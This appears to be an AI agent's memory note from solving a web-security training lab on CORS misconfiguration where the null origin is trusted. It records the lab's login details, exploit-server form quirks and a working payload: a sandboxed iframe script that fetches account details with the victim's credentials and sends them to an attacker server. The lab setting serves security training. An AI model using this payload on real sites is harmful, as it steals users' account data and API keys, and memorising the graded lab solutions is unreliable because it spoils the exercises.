---
metadata:
  node_type: memory
name: "lab-null-origin-whitelisted-attack arm A"
description: "lab-null-origin-whitelisted-attack solved: sandboxed srcdoc iframe gives null origin, /accountDetails ACAO:null exfil via Image; exploit-server needs responseFile+responseHead and GET /log reads the access log"
last_updated: 2026-10-10T19:46:52+08:00
created: 2026-10-10T19:46:52+08:00
---

## 2026-10-10 lab-null-origin-whitelisted-attack (arm A) — solved

Target: `/web-security/cors/lab-null-origin-whitelisted-attack` → instance `https://0abb0090...web-security-academy.net`, exploit server `https://exploit-0aaa0014...exploit-server.net`.

Chain:
1. `page_read` canonical path → lab_id `9d294029...` (path valid, no 404 fallback needed).
2. `range_launch launch-url` first call returned no instance (build_pending); `nap 25` then relaunch with SAME jar → instance_url.
3. Login wiener:peter (csrf from /login).
4. Probe `/accountDetails` with `Origin: null` → `access-control-allow-origin: null` + `access-control-allow-credentials: true` (vuln confirmed via `http_dump`, which prints ACAO/ACAC; http_session does not).
5. Store exploit: `<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://LAB/accountDetails',{credentials:'include'}).then(r=>r.text()).then(d=>{new Image().src='https://EXPLOIT/?k='+encodeURIComponent(d)})</script>"></iframe>`. Sandboxed srcdoc iframe gives the required `null` origin.
6. DELIVER_TO_VICTIM (must `--follow`), then read the access log.
7. Submit key via `POST /submitSolution answer=<key>` → `{"correct":true}`; `banner_verdict` → solved:true.

Exploit-server form gotchas (this build):
- Fields: `urlIsHttps`, `responseFile`, `responseHead`, `responseBody`, `formAction`.
- `responseFile=/` → 400 "footgun detected". Use a non-root path like `/exploit`.
- ACCESS_LOG via POST demands `responseFile` then `responseHead` and rejects without them; GET `/log` is the working read path (`formAction=ACCESS_LOG` + bare fields 400s).
- Victim fetches `/exploit/` (trailing slash) — the stored path serves either way.
- responseHead passed with JSON `\r\n` lands as literal `\r\n` text in the textarea yet still serves `Content-Type: text/html`; not worth fighting.

Note: `range_launch` reused:false here, so no stale-artifact disambiguation was needed.
